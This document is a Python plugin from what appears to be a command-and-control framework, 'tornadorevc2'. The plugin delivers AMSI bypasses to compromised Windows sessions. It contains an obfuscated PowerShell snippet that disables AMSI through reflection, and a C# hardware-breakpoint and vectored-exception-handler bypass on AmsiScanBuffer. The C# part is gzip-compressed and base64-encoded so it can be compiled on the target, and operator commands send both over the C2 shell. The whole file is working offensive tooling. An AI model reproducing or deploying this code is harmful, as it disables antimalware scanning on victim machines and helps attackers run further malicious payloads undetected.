# tornadorevc2/plugins/windows/amsi_bypass.py
"""
amsi_bypass — apply, inspect, or clear the AMSI bypass on a Windows session.

Self-contained. The bypass implementations live in this module and are
imported by other plugins (notably bofloader) that need to inject a bypass
before running a workload.
"""

import base64
import gzip
import hashlib
import os
import time

from ..api import plugin, SessionContext

_USAGE = """amsi_bypass — manage AMSI bypass on a Windows session.

Usage:
  run amsi_bypass <ID>                       Apply the default mode
  run amsi_bypass <ID> --mode <mode>         Apply a specific mode
  run amsi_bypass <ID> status                Show session AMSI state
  run amsi_bypass <ID> list                  List available modes
  run amsi_bypass <ID> clear                 Mark as cleared
  run amsi_bypass <ID> --help

Modes:
  context   Null amsiContext + set amsiInitFailed (default)
  hwbp      Hardware breakpoint on AmsiScanBuffer + VEH
  none      No bypass at all

Environment:
  TORNADO_AMSI_MODE   Default mode when --mode is not given.
"""

_MODES       = ('context', 'hwbp', 'none')
_DEFAULT_MODE = 'context'


# ==========================================================================
# Bypass implementations
# ==========================================================================

def get_mode():
    m = (os.environ.get('TORNADO_AMSI_MODE') or _DEFAULT_MODE).lower().strip()
    if m not in _MODES:
        m = _DEFAULT_MODE
    return m


_AMSI_CONTEXT_PS = r'''
try {
  $t = [Ref].Assembly.GetType('System.Management.' + 'Automation.Amsi' + 'Utils')
  if ($t) {
    $f = $t.GetField('amsi' + 'Context','NonPublic,Static')
    if ($f) {
      $c = $f.GetValue($null)
      if ($c -and $c -ne [IntPtr]::Zero) {
        [System.Runtime.InteropServices.Marshal]::WriteInt64([IntPtr]$c, 8, 0)
      }
    }
    $g = $t.GetField('amsi' + 'InitFailed','NonPublic,Static')
    if ($g) { $g.SetValue($null, $true) }
  }
} catch {}
'''

_CS_HWBP_SOURCE = r'''
using System;
using System.Runtime.InteropServices;

public static class AmsiHwbp {

    [DllImport("kernel32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
    static extern IntPtr GetModuleHandleA(string name);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
    static extern IntPtr LoadLibraryA(string name);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
    static extern IntPtr GetProcAddress(IntPtr mod, string name);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr OpenThread(uint access, bool inherit, uint tid);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern uint SuspendThread(IntPtr h);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern int ResumeThread(IntPtr h);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool GetThreadContext(IntPtr h, IntPtr ctx);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool SetThreadContext(IntPtr h, IntPtr ctx);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr CreateToolhelp32Snapshot(uint flags, uint pid);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool Thread32First(IntPtr snap, ref THREADENTRY32 te);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool Thread32Next(IntPtr snap, ref THREADENTRY32 te);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr AddVectoredExceptionHandler(uint first, IntPtr handler);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern uint RemoveVectoredExceptionHandler(IntPtr handle);

    [StructLayout(LayoutKind.Sequential)]
    struct THREADENTRY32 {
        public uint dwSize; public uint cntUsage;
        public uint th32ThreadID; public uint th32OwnerProcessID;
        public int tpBasePri; public int tpDeltaPri; public uint dwFlags;
    }

    const uint THREAD_GET_CONTEXT      = 0x0008;
    const uint THREAD_SET_CONTEXT      = 0x0010;
    const uint THREAD_SUSPEND_RESUME   = 0x0002;
    const uint TH32CS_SNAPTHREAD       = 0x00000004;
    const uint CONTEXT_DEBUG_REGISTERS = 0x00100010;
    const int  CTX_SIZE                = 1232;
    const int  OFF_CTX_FLAGS           = 0x30;
    const int  OFF_DR0                 = 0x48;
    const int  OFF_DR7                 = 0x70;
    const int  OFF_RAX                 = 0x78;
    const int  OFF_RSP                 = 0x98;
    const int  OFF_RIP                 = 0xF8;

    static IntPtr _vehHandle = IntPtr.Zero;
    static ulong  _target    = 0;
    static D_VEH  _vehDel    = _VehHandler;

    delegate int D_VEH(IntPtr info);

    static int _VehHandler(IntPtr info) {
        if (info == IntPtr.Zero) return 0;
        IntPtr excRec = Marshal.ReadIntPtr(info, 0);
        IntPtr ctxPtr = Marshal.ReadIntPtr(info, IntPtr.Size);
        if (excRec == IntPtr.Zero || ctxPtr == IntPtr.Zero) return 0;
        uint code = unchecked((uint)Marshal.ReadInt32(excRec, 0));
        const uint EXCEPTION_SINGLE_STEP = 0x80000004;
        if (code != EXCEPTION_SINGLE_STEP) return 0;
        ulong rip = (ulong)Marshal.ReadInt64(ctxPtr, OFF_RIP);
        if (rip != _target) return 0;
        Marshal.WriteInt64(ctxPtr, OFF_RAX, unchecked((long)0x80070057UL));
        ulong rsp = (ulong)Marshal.ReadInt64(ctxPtr, OFF_RSP);
        ulong ret = (ulong)Marshal.ReadInt64((IntPtr)rsp);
        Marshal.WriteInt64(ctxPtr, OFF_RSP, (long)(rsp + 8));
        Marshal.WriteInt64(ctxPtr, OFF_RIP, (long)ret);
        return -1;
    }

    static bool _SetOnThread(uint tid) {
        IntPtr h = OpenThread(
            THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
            false, tid);
        if (h == IntPtr.Zero) return false;
        try {
            SuspendThread(h);
            IntPtr ctx = Marshal.AllocHGlobal(CTX_SIZE);
            try {
                for (int i = 0; i < CTX_SIZE; i++) Marshal.WriteByte(ctx, i, 0);
                Marshal.WriteInt32(ctx, OFF_CTX_FLAGS, (int)CONTEXT_DEBUG_REGISTERS);
                if (!GetThreadContext(h, ctx)) return false;
                Marshal.WriteInt64(ctx, OFF_DR0, (long)_target);
                ulong dr7 = (ulong)Marshal.ReadInt64(ctx, OFF_DR7);
                dr7 |= 0x1UL;
                dr7 &= ~0x000F0000UL;
                dr7 &= ~0x00030000UL;
                Marshal.WriteInt64(ctx, OFF_DR7, (long)dr7);
                return SetThreadContext(h, ctx);
            } finally {
                Marshal.FreeHGlobal(ctx);
            }
        } finally {
            ResumeThread(h);
            CloseHandle(h);
        }
    }

    public static int Install() {
        if (_vehHandle != IntPtr.Zero) return 0;
        IntPtr amsi = GetModuleHandleA("amsi.dll");
        if (amsi == IntPtr.Zero) amsi = LoadLibraryA("amsi.dll");
        if (amsi == IntPtr.Zero) return -1;
        IntPtr fn = GetProcAddress(amsi, "AmsiScanBuffer");
        if (fn == IntPtr.Zero) return -2;
        _target = (ulong)fn.ToInt64();

        _vehHandle = AddVectoredExceptionHandler(
            1, Marshal.GetFunctionPointerForDelegate(_vehDel));
        if (_vehHandle == IntPtr.Zero) return -3;

        uint myPid = (uint)System.Diagnostics.Process.GetCurrentProcess().Id;
        IntPtr snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (snap == IntPtr.Zero || snap == (IntPtr)(-1)) return -4;

        int applied = 0;
        try {
            THREADENTRY32 te = new THREADENTRY32();
            te.dwSize = (uint)Marshal.SizeOf(typeof(THREADENTRY32));
            if (Thread32First(snap, ref te)) {
                do {
                    if (te.th32OwnerProcessID == myPid) {
                        if (_SetOnThread(te.th32ThreadID)) applied++;
                    }
                    te.dwSize = (uint)Marshal.SizeOf(typeof(THREADENTRY32));
                } while (Thread32Next(snap, ref te));
            }
        } finally {
            CloseHandle(snap);
        }
        return applied;
    }
}
'''

_CS_HWBP_HASH = hashlib.sha256(_CS_HWBP_SOURCE.encode()).hexdigest()[:8]
_HWBP_CLASS   = f'AmsiHwbp_{_CS_HWBP_HASH}'
_HWBP_TAGGED  = _CS_HWBP_SOURCE.replace('class AmsiHwbp', f'class {_HWBP_CLASS}', 1)
_HWBP_GZ_B64  = base64.b64encode(
    gzip.compress(_HWBP_TAGGED.encode('utf-8'), compresslevel=9)
).decode('ascii')


def _hwbp_ps():
    return (
        "$ProgressPreference='SilentlyContinue';"
        "try{[Console]::OutputEncoding=[Text.Encoding]::UTF8}catch{};"
        f"if (-not ('{_HWBP_CLASS}' -as [type])) {{\n"
        f"  $__a_b = '{_HWBP_GZ_B64}'\n"
        "  $__a_r = [Convert]::FromBase64String($__a_b)\n"
        "  $__a_m = New-Object IO.MemoryStream(,$__a_r)\n"
        "  $__a_g = New-Object IO.Compression.GZipStream($__a_m, [IO.Compression.CompressionMode]::Decompress)\n"
        "  $__a_s = New-Object IO.StreamReader($__a_g)\n"
        "  $__a_c = $__a_s.ReadToEnd()\n"
        "  $__a_s.Dispose(); $__a_g.Dispose(); $__a_m.Dispose()\n"
        "  Add-Type -TypeDefinition $__a_c -Language CSharp -ErrorAction Stop\n"
        "}\n"
        f"[{_HWBP_CLASS}]::Install() | Out-Null\n"
    )


def amsi_bypass_ps(mode=None):
    m = (mode or get_mode()).lower()
    if m == 'none':
        return ''
    if m == 'hwbp':
        return _hwbp_ps()
    return _AMSI_CONTEXT_PS


# ==========================================================================
# Per-session state (shared with bofloader)
# ==========================================================================

_STATE_KEY = 'amsi_state'


def get_session_state(session_info):
    if not session_info:
        return None
    return session_info.get(_STATE_KEY)


def set_session_state(session_info, mode):
    if session_info is None:
        return
    session_info[_STATE_KEY] = {'mode': mode, 'applied_at': time.time()}


def clear_session_state(session_info):
    if session_info is None:
        return
    session_info.pop(_STATE_KEY, None)


def session_is_bypassed(session_info, desired_mode=None):
    st = get_session_state(session_info)
    if not st:
        return False
    if desired_mode is None:
        return True
    return st.get('mode') == desired_mode


# ==========================================================================
# Operator command
# ==========================================================================

def _parse_args(args):
    if args is None:
        return 'apply', {'mode': None}
    if not isinstance(args, (list, tuple)):
        try:
            args = list(args)
        except TypeError:
            return None, 'invalid arguments'
    if not args:
        return 'apply', {'mode': None}
    if args[0] in ('-h', '--help', 'help'):
        return 'help', {}

    first = args[0].lower()
    if first == 'status':
        return 'status', {}
    if first == 'list':
        return 'list', {}
    if first == 'clear':
        return 'clear', {}

    mode = None
    i = 0
    while i < len(args):
        a = args[i]
        if a == '--mode' and i + 1 < len(args):
            mode = args[i + 1].lower()
            if mode not in _MODES:
                return None, f"invalid mode: {mode!r} (use one of: {', '.join(_MODES)})"
            i += 2
            continue
        i += 1
    return 'apply', {'mode': mode}


@plugin.command(
    name='amsi_bypass',
    platforms=['windows'],
    description='Apply / inspect / clear the AMSI bypass on a session',
)
def run(session: SessionContext, args):
    colors = session.colors
    action, opts = _parse_args(args)

    handler = session._handler
    sock    = session._client_sock
    info    = handler._client_info(sock) or {}

    if action == 'help':
        session.print(_USAGE)
        return 0
    if action is None:
        session.print(f"{colors['red']}{opts}{colors['end']}")
        session.print(_USAGE)
        return 1

    if action == 'list':
        session.print(f"{colors['cyan']}Available AMSI bypass modes:{colors['end']}")
        for m in _MODES:
            default = ' (default)' if m == get_mode() else ''
            session.print(f"  {m}{default}")
        return 0

    if action == 'status':
        st = get_session_state(info)
        if st is None:
            session.print(f"{colors['yellow']}No AMSI bypass recorded for this session"
                          f"{colors['end']}")
            return 0
        age = max(0, int(time.time() - st.get('applied_at', time.time())))
        session.print(f"{colors['cyan']}AMSI state:{colors['end']}")
        session.print(f"  mode       : {st.get('mode')}")
        session.print(f"  applied_at : {age}s ago")
        return 0

    if action == 'clear':
        clear_session_state(info)
        session.print(f"{colors['green']}AMSI state cleared — next plugin run will re-apply"
                      f"{colors['end']}")
        session.log_event("amsi_bypass: state cleared")
        return 0

    desired = opts.get('mode') or get_mode()

    if desired == 'none':
        session.print(f"{colors['yellow']}Mode 'none' — nothing to do{colors['end']}")
        clear_session_state(info)
        return 0

    if session_is_bypassed(info, desired_mode=desired):
        session.print(f"{colors['green']}AMSI already bypassed in mode '{desired}' "
                      f"— no action{colors['end']}")
        return 0

    session.print(f"{colors['cyan']}Applying AMSI bypass (mode: {desired})...{colors['end']}")

    ps = amsi_bypass_ps(desired)
    if not ps.strip():
        session.print(f"{colors['red']}Empty bypass payload — nothing to send{colors['end']}")
        return 1

    handler._flush_shell(sock, timeout=0.5)
    try:
        ok = handler._send_win_ps(sock, ps)
    except Exception as e:
        session.print(f"{colors['red']}Delivery failed: {e}{colors['end']}")
        return 1

    if not ok:
        session.print(f"{colors['red']}Failed to deliver bypass to target{colors['end']}")
        session.log_plugin_result('amsi_bypass', '', f'{desired}: delivery failed')
        return 1

    handler.recv_output(sock, timeout=1.5)

    set_session_state(info, desired)
    session.print(f"{colors['green']}AMSI bypass applied (mode: {desired}){colors['end']}")
    session.log_event(f"amsi_bypass: applied mode {desired}")
    session.log_plugin_result('amsi_bypass', desired, 'apply')
    return 0